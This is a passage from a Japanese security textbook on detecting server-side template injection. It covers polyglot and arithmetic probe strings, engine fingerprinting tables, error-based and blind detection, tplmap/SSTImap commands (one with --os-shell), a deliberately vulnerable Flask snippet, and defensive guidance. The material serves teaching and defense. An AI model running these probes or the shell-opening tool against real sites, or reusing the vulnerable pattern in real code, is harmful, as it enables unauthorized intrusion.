このペイロードは、複数のテンプレートエンジンの制御構文の記号（`${`, `{{`, `<%`, `[`, `%`, `'`, `"`, `}}`, `\`）を1つの文字列に詰め込んだ「ポリグロット（polyglot、複数の処理系にまたがって解釈可能な文字列）」です。**なぜこれが有効か**というと、テンプレートエンジンのパーサ（構文解析器）は、テンプレート内に自分の制御構文の開始トークン（例えば`{{`）を見つけると、それに対応する終了トークン（`}}`)までを「コード領域」として切り出そうとします。この切り出し処理の途中で対応する閉じ括弧が見つからなかったり、想定外の記号（バックスラッシュや引用符）が混入していたりすると、パーサは構文エラーを投げます。つまりこのペイロードは、**エンジンが何であれ「パーサに何らかの形で触れさせる」ことを狙った撒き餌**です。応答に次のいずれかが見られたら、テンプレート処理が起きている強い兆候です。

- サーバーエラー（500番台）やスタックトレースが返る
- ペイロードの一部だけが欠落・変形して返る(パーサが一部を「食べた」証拠)
- 通常の入力とは明らかに異なる応答時間・応答内容になる

一方で、ペイロードがそのまま（無変化で）出力されるだけなら、その箇所はテンプレート処理を経ていない、あるいはHTMLエスケープされた上でDOMに表示されているだけ（＝SSTIではなくXSSの可能性）と判断します。

### ステップ2: 数式評価テストでSSTIとXSSを切り分ける

ステップ1で「怪しい」と分かったら、次は**数式（算術式）が評価されるかどうか**を見ます。これがSSTIとXSSを区別する最も重要な一手です。

```
{{7*7}}
${7*7}
```

- 出力に `49` が現れる → 入力が**テンプレートのコードとして評価**されている。これはSSTIである（ブラウザ側のDOM挿入ではこの計算は起こり得ない）
- 出力に `7*7` や `{{7*7}}` がそのまま（エスケープされずに）表示される → ブラウザに渡ってからJavaScriptとして解釈されている可能性があり、XSSの疑いが濃い
- 出力が空、あるいはエスケープされた文字列（`&#123;&#123;7*7&#125;&#125;`など）になる → サニタイズ（無害化処理）が効いており、その経路では injection しにくい

> 出典: GoSecure: Template Injection in Action（decision treeワークショップ） — https://gosecure.github.io/template-injection-workshop/

このワークショップ資料はJames Kettle（PortSwigger、著名な脆弱性研究者）の検出手法を引用し、「ライブラリのバージョンが変わっても壊れにくい、基礎的な構文・メソッド名だけを使う」ことを推奨しています。つまり凝った内部API（後述する`__class__`のようなPythonの特殊属性など）をいきなり使うのではなく、まずはどの言語・エンジンにも共通する四則演算という「最小公倍数」の式で当たりを取ってから、的を絞って高度なペイロードに進むのが安全かつ効率的です。

**コード文脈（コンテキスト）での確認**も重要です。プレーンテキストの出力欄だけでなく、テンプレートのソースそのものにユーザー入力が挿入されるケース（例えば `greeting = "Hello " + username` のような組み立てをテンプレート内マクロで行っている場合）では、次のように入力を細工して境界を破壊できるか試します。

```
data.username を "data.username}}hello" に変える
```

これによって、想定されていたテンプレート構文の閉じ括弧`}}`を入力側から挿入し、後続の`hello`という文字列がテンプレートの外側（＝プレーンテキストとして）出力されるかどうかを確認します。出力されれば、ユーザー入力がテンプレートのソースコード自体を汚染できている、つまりより深刻な形のSSTIであることが分かります。

### ステップ3: 複数構文をぶつけてエンジン候補を絞り込む

数式評価が確認できたら、次は**エンジンごとに解釈できる制御構文が違う**という性質を利用して候補を絞ります。代表的な4つの構文パターンと、その反応の対照表は次の通りです。

| ペイロード | Jinja2 | Mako | Twig | FreeMarker | Velocity | ERB | Smarty |
|---|---|---|---|---|---|---|---|
| `{{7*7}}` | 49 | Error | 49 | Error | Error | Error | Error |
| `${7*7}` | Error | 49 | Unmodified | 49 | Unmodified | Unmodified | Unmodified |
| `#{7*7}` | Error | Error | Unmodified | 49 | Unmodified | Unmodified | Unmodified |
| `<%= 7*7 %>` | Error | Error | Error | Error | Error | 49 | Error |
| `${7/0}` | Error | Error | Unmodified | ZeroDivision | Unmodified | Unmodified | Unmodified |

> 出典: HackTricks: SSTI（index、全エンジン横断） — https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html

**なぜこの表がdecision treeとして機能するか**を仕組みレベルで説明します。各テンプレートエンジンはコンパイル時（またはレンダリング時）に、まず自分自身の「デリミタ（区切り文字）」を正規表現やトークナイザで走査します。例えばJinja2は`{{ ... }}`を式評価、`{% ... %}`を文とみなすよう字句解析器（レキサー）が組まれており、`${ ... }`という記法はJinja2の語彙には存在しないため、単なる文字列としてそのまま出力される（＝無変化）か、コンテキストによってはPythonの文字列フォーマット構文と衝突してエラーになることがあります。逆にFreeMarkerは`${ ... }`を式評価用の主構文として認識しますが、`{{ ... }}`という二重中括弧はFreeMarkerの語彙にないため、そのままエラーになるか無視されます。つまり、**「どの記号列に対して"評価"という反応が起きるか」はエンジンのレキサー実装そのものを外部から観測している**ことになり、これがブラックボックス（内部コードを見ずに外部から挙動だけで判断する）でのエンジン特定を可能にしています。

さらに`${7/0}`という**ゼロ除算エラー**を使ったテストが有効なのは、エラーメッセージの文言や例外クラス名が実装言語ごとに固有だからです。ゼロ除算はどの言語でも例外的な状態として扱われるため、成功時に何も情報が得られない場合でも、あえて失敗させることで情報を引き出す「エラーベース検出」という技法になっています。

Java系エンジン(Thymeleaf, Spring EL連携箇所など)で`${...}`が効かない場合は、以下のような類似デリミタも試す価値があります。

```
#{...}
*{...}
@{...}
~{...}
```

これらはThymeleafが持つ複数の式構文（変数式・選択式・リンク式・フラグメント式）に対応しており、アプリケーションがどの属性（`th:text`, `th:href`など）にユーザー入力を渡しているかによって、有効な構文が変わってきます。

### ステップ4: エラーメッセージから実装言語・エンジンを裏付ける

数式そのものが評価されなくても、エラーメッセージだけで実装言語を絞り込めることがあります。ゼロ除算や不正なメソッド呼び出し（例: `(1/0).zxy.zxy`のように存在しないプロパティへのアクセスを連鎖させる）を仕込むと、次のような言語固有のエラー文字列が露出します。

| エラーメッセージの特徴 | 推定される実装言語/エンジン |
|---|---|
| `ZeroDivisionError` | Python（Jinja2, Mako, Django） |
| `java.lang.ArithmeticException` | Java系エンジン（FreeMarker, Velocity, Thymeleaf） |
| `ReferenceError` または `TypeError` | Node.js/JavaScript系（Nunjucks, Handlebars, Pugなど） |
| `Division by zero` | PHP（Twig, Smarty） |
| `divided by 0` | Ruby（ERB, Slim） |
| `Arithmetic operation failed` (相当の文言) | FreeMarker（Java） |

> 出典: PayloadsAllTheThings: SSTI（README、検出手法） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

**なぜこれが成立するか**は単純で、各言語ランタイムの例外機構(exception mechanism)はそれぞれ固有の例外クラス階層と既定のエラーメッセージフォーマットを持っており、テンプレートエンジンがそれをキャッチせずスタックトレースをそのまま(あるいはある程度)HTTPレスポンスに漏らしてしまう実装（本番運用ではあってはならないが、開発モードやデバッグモードで頻発する）では、この文字列がそのまま実装言語の指紋になります。逆に言えば、**エラーメッセージを一切外部に漏らさない堅牢な実装（防御側の対策として後述）に対しては、この手法は無力**であり、盲目的(ブラインド)な検出手法（後述のブール型テスト等）に頼る必要があります。

### ステップ5: ブラインド(盲目的)検出 — エラーも出力も見えない場合

出力もエラーメッセージも一切見えない、あるいはWAFに握りつぶされてしまう環境では、**真偽が反転する2つの式のペア**を送り、レスポンスの違い（ステータスコード、応答時間、応答本文の分岐）だけを手がかりに判定します。

| テスト | 正しい構文の式 | 意図的に壊した式 |
|---|---|---|
| 1 | `(3*4/2)` | `3*)2(/4` |
| 2 | `((7*8)/(2*4))` | `7)(*)8)(2/(*4` |

> 出典: PayloadsAllTheThings: SSTI（README、検出手法） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

原典は「少なくとも2組のペイロードを使うことで誤検知(false positive)を避けられる」と述べています。**理由**は、たまたまアプリケーション側のバリデーションや別のバグが1種類の壊れた構文だけを別扱いしている可能性を排除するためです。正しい式では常に一定の応答（例えばステータス200、特定の応答時間）、壊れた式では常に別の応答（構文エラーによる500、あるいは明確な応答時間の差）が2組以上のペアで一貫して再現できれば、ブラインドSSTIの存在を統計的に裏付けたことになります。

### エンジン別の確定用ペイロードと、その裏にある仕組み

数式評価とデリミタ差でおおよその候補が絞れたら、最後に各エンジン固有の機能・API名を使って確定させます。以下は原典に基づく代表例です。

**Python系（Jinja2/Tornado, Mako）**

```
{{7*7}}          # Jinja2/Tornado: 49
{{foobar}}       # 未定義変数。Jinja2はデフォルトで例外を投げずに空文字を返すことがあり、
                 # Tornadoはより厳格にエラーになりやすい、という違いで区別できる
${7*7}           # Mako: 49
<% ... %>        # Mako: Pythonコードブロックとして実行可能
```

Jinja2と同系統のTornadoは共に二重中括弧`{{ }}`を使いますが、Tornadoは`{% import os %}`のようなPythonの`import`文をテンプレート内で直接許可している点が大きな違いです。これは、Tornadoのテンプレートコンパイラがユーザーのテンプレートを事実上「素のPythonコード」に近い形へトランスパイル（変換）する設計思想を持っているためで、Jinja2よりもサンドボックス（実行環境の隔離）が薄いという、後のRCE（Remote Code Execution）到達難易度に直結する重要な違いです。

**Java系（FreeMarker, Velocity, Thymeleaf）**

```
${7*7}                      # FreeMarker: 49
#set($x=7*7)${x}            # Velocity: 変数宣言と式展開の2段構え
```

FreeMarkerは`${ ... }`を「即時評価される式」として扱う一方、Velocityは`#set`のような「ディレクティブ(directive、`#`で始まる制御構文)」で変数を宣言してから`$変数名`で参照する、という2段階の設計になっています。この違いが生まれる背景には、Velocityがそもそも「テンプレート内でのロジック記述を最小限に抑える」という設計方針を持ち、複雑な式を直接書かせずディレクティブ経由にすることで安全性を高めようとした歴史的経緯があります(もっとも、後の章で扱う通り、それでもRCEには到達可能です)。

**PHP系（Twig, Smarty）**

```
{{7*7}}                 # Twig: 49
{{foobar}}               # Twig: 出力なし(未定義変数は静かに無視される)
{$smarty.version}        # Smarty固有の組み込み変数。存在すればSmartyと確定できる
{php}...{/php}           # Smarty 2系のPHPコード直接実行タグ(v3以降は非推奨・要設定変更)
```

Twigの`_self`という特殊変数（`{{_self.env...}}`のようにアクセスする）は、Twigの内部API(環境オブジェクトなど)を一部公開するために存在するものです。これが応答するかどうかは、Twig特有の実装(内部的に自身のRuntime環境をテンプレートへ部分的に露出させている設計)を突いた確定的な指紋になります。

**Ruby系（ERB, Slim）**

```
<%= 7*7 %>       # ERB: 49
{ 7 * 7 }        # Slim: 49相当
```

ERBはRubyの`erb`ライブラリがテンプレート文字列をRubyコードへほぼそのまま変換して`eval`に近い形で実行する仕組みのため、`<%= %>`内は事実上「生のRubyコード」であり、これが後述するRCEの直接性の高さにつながります。

**Node.js系（Pug/Jade, Handlebars, Nunjucks）**

```
#{7*7}           # Pug/Jade: 49
{{7*7}}          # Nunjucks: 49
```

Handlebarsは意図的に「ロジックレス(logic-less)」を設計思想としており、算術式やメソッド呼び出しをテンプレート内に書く構文自体を提供していません。そのため`{{7*7}}`のような数式テストではSSTIの兆候が一切見えず、「数式が効かない=SSTIでない」と早合点してしまう典型的な誤判定ポイントです。Handlebarsに対しては、後述する`{{#with}}`ヘルパーの悪用や、コンパイルオプション(`compile`のセキュリティ設定)の不備を突く、より専用性の高いペイロードでの確認が必要になります。

### 検出を自動化するツール

手作業でこの決定木を毎回たどるのは非効率なため、次のようなツールが実務で使われています。

```bash
# tplmap（epinna、初期の代表的ツール。Python2ベース）
python2.7 ./tplmap.py -u 'http://target.com/page?name=John*'  --os-shell

# SSTImap（vladko312、tplmapの後継として開発が続くPython3ツール）
python3 ./sstimap.py -u 'https://example.com/page?name=John' -s

# TInjA（Hackmanit、比較的新しい検出特化ツール）
tinja url -u "http://example.com/?name=Kirlia"
```

> 出典: PayloadsAllTheThings: SSTI（README、検出手法） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

`*`はtplmap/SSTImapにおいて「ここにペイロードを注入せよ」という位置マーカーです。これらのツールは内部的に、本節で説明したのと同じ「数式評価→デリミタ差分→固有API」の決定木を自動で総当たりし、応答の差分を機械的に比較して候補エンジンをスコアリングします。人手でのdecision treeの理解があれば、ツールが誤検知した場合や未対応エンジンに遭遇した場合にも、原理から手動で切り分けを続けられます。

Hackmanitが公開している「Template Injection Table」は、44種類の主要テンプレートエンジンに対する最効率ポリグロットとその期待応答を一覧化した対話的な表であり、本節の表がカバーしきれないマイナーなエンジンに遭遇した際の一次情報源として有用です（防御目的の学習として参照する分には問題ありませんが、実サービスへの無許可の試行は行わないでください）。

### 防御の視点からの含意

decision treeを理解することは攻撃のためだけでなく、防御設計にも直結します。

1. **エラーメッセージの抑制**: スタックトレースや例外クラス名を本番環境で外部に返さないことは、ステップ4の言語特定を無力化する基本策です。
2. **サンドボックス化されたテンプレート環境の使用**: Jinja2の`SandboxedEnvironment`、Twigの`sandbox`拡張など、危険なメソッド呼び出しや属性アクセスを制限した実行環境を使うことで、数式評価自体は成立してもRCEへの到達を防げます。
3. **ユーザー入力をテンプレートの「データ」としてのみ扱い、「テンプレート文字列」として渡さない**: 根本的な対策は、`render_template_string(user_input)`のような、ユーザー入力をコンパイル対象のテンプレートソースとして扱う実装を避け、常に変数として渡すことです。
4. **ログの監視**: 本節の各種ポリグロット(`${{<%[%'"}}%\`など)や`7*7`, `7/0`といった典型的なプロービング文字列がアクセスログやWAFログに現れた場合、SSTI探索の試みとして検知ルールに組み込むことができます。

### まとめ

SSTIの検出とエンジン特定は、(1)汎用ポリグロットでテンプレート処理の有無を疑う、(2)数式評価でSSTIとXSSを切り分ける、(3)複数デリミタの反応差でエンジン候補を絞る、(4)エラーメッセージで実装言語を裏付ける、(5)出力が見えない場合はブール型のペア比較でブラインド検出する、という5段階のdecision treeとして整理できます。この判定木の背後には、各テンプレートエンジンのレキサー・パーサ実装の違いと、各言語ランタイムの例外機構の違いという、2つの技術的な仕組みが一貫して効いています。次節以降では、この特定作業で判明したエンジンごとに、実際にRCEへ到達するための具体的なペイロード構築を扱います。

## 日本語SSTI解説とラボ動画

本節では、SSTI（Server-Side Template Injection、サーバーサイド・テンプレートインジェクション）を扱う日本語の実務系記事2本と、PortSwiggerのラボを解説する動画プレイリストを取り上げる。前章までに述べた「テンプレートエンジンが式を評価する」という核心メカニズムを、日本語圏のセキュリティベンダーがどのように読者向けに説明しているかを確認し、防御側の観点から要点を整理する。

### 1. パーソルクロステクノロジーによるSSTI紹介記事

パーソルクロステクノロジー（Persol Cross Technology）のセキュリティ記事は、SSTIを「テンプレート構文を利用してサーバー上で悪意のあるコードが実行されうる」脆弱性として紹介している。読者層はアプリケーション開発者や社内セキュリティ担当者を想定しており、Flask（Python製の軽量Webフレームワーク）とJinja2（Flaskが標準採用するテンプレートエンジン）を題材に、次のような基本的な仕組みを説明している。

#### 仕組み: テンプレートエンジンはなぜ式を評価するのか

テンプレートエンジンは、`{{ 変数名 }}` のような二重波括弧の構文を「プレースホルダ」ではなく「評価すべき式」として扱う。これは利便性のための設計であり、開発者がテンプレート内で変数展開だけでなく、条件分岐・ループ・簡単な演算までできるようにするためである。たとえばJinja2では次のように書ける。

```jinja2
Hello, {{ name }}!
```

ここで `name` が単なる文字列であれば問題はない。しかし記事が示すように、開発者が `render_template_string()`（テンプレート文字列を直接コンパイル・実行してHTMLを生成するFlask/Jinja2のAPI）にユーザー入力をそのまま連結して渡してしまうと、状況が一変する。

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    # 脆弱な実装: ユーザー入力をテンプレート「文字列」として結合してしまう
    template = "Hello, " + name + "!"
    return render_template_string(template)
```

このコードの危険性は、`name` という**シンク**（sink、外部からの入力が最終的に実行・解釈される危険な代入先や処理箇所を指す用語）が、単なる「表示される値」ではなく「テンプレートのソースコードの一部」になっている点にある。攻撃者が `name=` パラメータに `{{7*7}}` を渡すと、サーバーは以下のように解釈する。

```
入力: ?name={{7*7}}
テンプレート文字列: "Hello, {{7*7}}!"
Jinja2の評価結果: "Hello, 49!"
```

ここで `49` という数値が返ってくること自体が、SSTI検出の最も基本的なシグナル（オラクル）である。単なるXSS（クロスサイトスクリプティング、ブラウザ側でスクリプトが実行される脆弱性）であれば `{{7*7}}` という文字列がそのまま画面に出力されるはずだが、SSTIではサーバー側で**計算済みの結果**が返ってくる。この違いが、SSTIとXSSを見分ける決め手になる（本教科書の前章で扱った検出手法と一致する）。

記事はさらに、この脆弱性が単なる理論上のリスクにとどまらず、日本の業界団体ISOG-J（日本セキュリティオペレーション事業者協議会）が策定する「Webアプリケーション脆弱性対応ガイドライン」にSSTIが正式に追加された、という実務的な位置づけの変化にも言及している。これは、SSTIが「一部の研究者が指摘するニッチな脆弱性」から「実務のセキュリティ要件として組織が対応すべき項目」へと格上げされたことを意味し、企業のセキュア開発基準にSSTI対策を組み込む根拠となる。

#### 防御策

記事が推奨する対策は次の2点に整理できる。

1. **ユーザー入力を安易に信頼しない**: 入力値の検証（バリデーション）を実装する。具体的には、テンプレートに渡す前の入力を許可リスト（allowlist）方式でチェックし、テンプレート構文として意味を持つ文字（`{{`, `}}`, `{%`, `%}` など）を含む入力を拒否または無害化する。
2. **テンプレートを「文字列結合」で組み立てない**: そもそも `render_template_string()` にユーザー入力を連結した文字列を渡すのではなく、`render_template()`（あらかじめファイルとして用意された固定のテンプレートを読み込み、変数だけを差し込むAPI）を使い、ユーザー入力は**変数としてのみ**渡す設計にする。この設計変更により、ユーザー入力がテンプレートのソースコードそのものに混入する経路が構造的に断たれる。

記事はまた、複数のテンプレートエンジンを対象にDocker環境で検証できるGitHubリポジトリを参照資料として挙げており、開発者が自組織で使用しているテンプレートエンジンの挙動を安全に確認できることを示唆している（本教科書のスコープ上、具体的な攻略手順やペイロード一覧の転載は行わない）。

> 出典: SSTI（サーバーサイドテンプレートインジェクション）とは — https://staff.persol-xtech.co.jp/corporate/security/article.html?id=94

### 2. Classmethod SecurityによるSSTI解説記事

株式会社クラスメソッドのセキュリティチームによる記事（元URL `https://www.classmethod-security.jp/post/_ssti` は `https://security.classmethod.jp/post/_ssti` に301リダイレクトされており、本節ではリダイレクト先の内容を確認した）は、SSTIをより体系的に定義している。

> 「サーバーサイド・テンプレートインジェクション（SSTI）は、Webアプリケーションがテンプレートエンジンを使用している際に発生する脆弱性です。」

この記事も同じくFlaskの脆弱なコード例を用いており、`name` パラメータをテンプレートに直接埋め込む例を示す。ユーザーが `{{ 7*7 }}` を入力すると、アプリケーションが `Hello, 49!` を返すという、パーソルの記事と同様のオラクルを提示している。この一致は、SSTIの検出手法として「数式評価による確認」が業界標準的な手法であることを裏付けている。

#### 影響の整理: なぜ「フルRCE」まで到達しうるのか

記事は影響を次の3段階で整理している。

- **リモートコード実行（RCE）**: 「攻撃者は、サーバー上で任意のコードを実行できるため、システムの完全な制御を奪う」。これは、多くのテンプレートエンジンが単なる文字列展開だけでなく、Pythonのようなホスト言語のオブジェクトモデルへの参照を許してしまう設計になっているためである。たとえばJinja2は式の中でPythonオブジェクトの属性アクセス（`obj.attr`や`obj.__class__`のようなドット記法）を許可しており、これを辿ることでオブジェクト階層を遡り、最終的に `os.popen` や `subprocess` のようなコード実行手段に到達できる（本教科書のスコープ上、具体的な脱出チェーンのペイロードは記載しない。原理としては「サンドボックスされているはずの式評価コンテキストから、言語ランタイムの内部オブジェクトへ到達できてしまう」という設計上のギャップが根本原因である）。
- **情報漏洩**: 認証情報やAPIキーなど、サーバープロセスがアクセスできる機密情報の窃取。テンプレートエンジンの評価コンテキストには、しばしばアプリケーションの設定オブジェクト（`config`など）がグローバル変数として渡されており、これを列挙されると環境変数や秘密鍵が露出することがある。
- **サービス妨害**: リソースを大量消費する処理（無限ループや巨大な文字列生成など）をテンプレート内で実行させることによるDoS。

#### 検出手法

記事が挙げる検出方法は次の通りである。

- テンプレートエンジン固有の構文（Jinja2なら `{{}}`、他のエンジンなら `${}` や `<%= %>` など）を試す。
- 数式を注入し、評価結果が返るかを観察する。
- 自動化されたセキュリティスキャンツールを利用する。

これは前章（第7章前半）で扱った「候補構文を総当たりし、エンジン固有の応答差分からエンジンを特定する」というポリグロット的アプローチと整合する。

#### 防御策

- ユーザー入力をテンプレート処理に渡す前に、サニタイズ・エスケープを行う。
- テンプレートエンジンを安全な設定（サンドボックス化されたAPIや、危険な組み込み関数へのアクセスを遮断した実行環境）で利用する。
- 不要なサーバーサイドのコード評価機能を無効化する。
- 動的にテンプレート文字列を生成するのではなく、事前定義済みの固定テンプレートを使用する。

この最後の一点は、パーソルの記事とも共通する結論であり、SSTI対策の本質を端的に表している。すなわち「ユーザー入力は**データ**としてのみテンプレートに渡し、**テンプレートのコード自体**として扱わせない」という設計原則である。これはSQLインジェクション対策における「プレースホルダを使い、SQL文字列を動的に組み立てない」という原則と構造的に同じであり、読者はここでインジェクション系脆弱性全般に共通する防御思想（コードとデータの分離）を再確認できる。

> 出典: SSTIとは？ — https://security.classmethod.jp/post/_ssti（元URL https://www.classmethod-security.jp/post/_ssti から301リダイレクト）

### まとめ: 日本語資料が示す共通の結論

本節で確認した2本の日本語記事は、用いる言葉こそ異なるが、SSTIの本質について完全に一致した結論に達している。

1. テンプレートエンジンは `{{ }}` のような構文を「評価すべき式」として扱う設計になっている。
2. ユーザー入力をテンプレートの**ソースコード自体**（文字列結合によって生成されるテンプレート文字列）に混入させると、攻撃者はその評価機構を悪用してサーバー上で任意の式・コードを実行できる。
3. 検出の第一歩は、数式（`{{7*7}}`など）を注入し、計算済みの結果が返ってくるかを確認することである。
4. 唯一確実な防御は、ユーザー入力をテンプレートの**コード**としてではなく、常に**データ（変数の値）**としてのみ渡すよう設計することであり、事前定義済みの固定テンプレートと `render_template()` のような安全なAPIの利用、入力値の検証・エスケープがこれを補完する。

この「コードとデータの分離」という原則は、次節以降で扱うテンプレートエンジンごとの脱出手法の技術的詳細を学ぶ上でも、常に立ち返るべき防御側の判断基準となる。
